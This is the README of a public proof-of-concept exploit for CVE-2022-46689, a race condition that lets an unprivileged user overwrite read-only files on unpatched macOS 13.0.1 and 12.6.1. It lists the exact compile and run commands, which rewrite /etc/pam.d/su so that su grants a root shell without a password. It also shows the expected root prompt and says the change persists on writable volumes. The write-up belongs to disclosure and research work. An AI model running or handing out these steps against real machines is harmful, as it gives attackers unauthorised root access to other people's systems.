Get root on macOS 13.0.1 with [CVE-2022-46689](https://support.apple.com/en-us/HT213532) (macOS equivalent of the Dirty Cow bug), using the testcase extracted from [Apple's XNU source](https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c).

https://worthdoingbadly.com/macdirtycow/

## Usage
On a macOS 13.0.1 / 12.6.1 (or below) machine, run:

```
clang -o switcharoo vm_unaligned_copy_switch_race.c
sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
./switcharoo /etc/pam.d/su overwrite_file.bin
su
```

You should get:

```
% ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
RO mapping was modified
% su
sh-3.2# 
```

Tested on macOS 13 beta (22A5266r) with SIP off (it should still work with SIP on).

If your system is fully patched (macOS 13.1 / 12.6.2), it should instead read:

```
$ ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
vm_read_overwrite: KERN_SUCCESS:9865 KERN_PROTECTION_FAILURE:3840 other:0
Ran 13705 times in 10 seconds with no failure
```

and running `su` should still ask for a password.

Thanks to Sealed System Volume, running this on any file on the /System volume only modifies the file temporarily: It's reverted on reboot. Running it on a file on a writeable volume will preserve the modification after a reboot.

## Credits

- Ian Beer of Project Zero for finding the issue. Looking forward to your writeup!
- Apple for the test case. (I didn't change anything: I just added the command line parameter to control what to overwrite.)
- [SSLab@Gatech](https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf) for the trick to disable password checking using `/etc/pam.d`.
